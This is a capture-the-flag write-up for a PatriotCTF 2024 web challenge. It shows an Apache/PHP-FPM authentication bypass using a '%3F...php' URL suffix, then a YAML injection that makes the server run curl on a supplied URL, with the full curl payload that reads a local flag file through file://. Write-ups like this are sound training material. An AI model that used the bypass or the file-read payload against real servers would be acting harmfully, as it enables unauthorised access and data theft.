---
title: PatriotCTF 2024 Web Kiran Sau Problem

categories: [Apache, Web Pentest, CTF, Misconfig, PHP]

tags: [CURL, PHP, Web, Pentest, APACHE, CTF]

image: /assets/img/uploads/PCTF.png

---
# TLDR
ACL Misconfigure -> YAML input issue 

![[Pasted image 20240927024141.png]]
## Part 1
```bash
# create .htpasswd file
RUN htpasswd -bc /etc/apache2/.htpasswd admin TEST_PASSWORD
```
index.php have nothing to show while challenge.php shows basic login form and using given password in the dockerfile works locally but not on the web challenge site.

```php
# Flag location
RUN mkdir /get-here \
    && echo "PCTF{TEST_FLAG}" > /get-here/flag.txt
```
flag is stored inside `/get-here/flag.txt`

000-default.conf
```bash
<Files "challenge.php">
    AuthType Basic 
    AuthName "Admin Panel"
    AuthUserFile "/etc/apache2/.htpasswd"
    Require valid-user
</Files>
```
bruteforce password is an option but probably only do when last resort

According to hacktricks : 
#### 
**ACL Bypass**

It's possible to access files the user shouldn't be able to access even if the access should be denied with configurations like:

```bash
<Files "admin.php">
    AuthType Basic 
    AuthName "Admin Panel"
    AuthUserFile "/etc/apache2/.htpasswd"
    Require valid-user
</Files>
```

This is because by default PHP-FPM will receive URLs ending in `.php`, like `http://server/admin.php%3Fooo.php` and because PHP-FPM will remove anything after the character `?`, the previous URL will allow to load `/admin.php` even if the previous rule prohibited it.

https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache#acl-bypass
(YES I copied everything :D)


### Crafted Payload
```
http://chal.competitivecyber.club:8090/challenge.php%3Fanything.php
```
with this payload we are able to authenticated into challenge page

## Part 2
```php
$input = $_GET['country'];
$url = $_GET['url'];
```
Reading the source code reveals that there is two GET variables we can use.


```yaml
$yaml = <<<EOF
- country: $input
- country_code: $countryList[$input]
EOF;
```
Each input was passed into the yaml file and no input validation was done


```php
if (isset($input)) {
    if (array_key_exists($parsed_arr[0]['country'], $countryList)) {
        echo "The country code for ".$parsed_arr[0]['country']." is ". $cc.'<br>';
        run($cc, $url);
```

```
Afghanistan%20
```
Therefore we can add more into the yaml entry by abusing space aka %20 by adding in nothing


```yaml
- country: Afghanistan
- country_code: 
```
Expected resulted modified yaml entry


```php
function run($cc, $url) {

    echo "Country code: ".$cc."<br>";
    if (!$cc) {
        system(escapeshellcmd('curl '.$url));
    } 
    return;
}
```
This will then trigger `!$cc` 


### Final payload
```
curl -v "http://chal.competitivecyber.club:8090/challenge.php%3Fooo.php?country=Afghanistan%20&url=file:///get-here/flag.txt"

PCTF{Kiran_SAU_Manifested}
```
Using local file read function of curl `file://` to get the flag
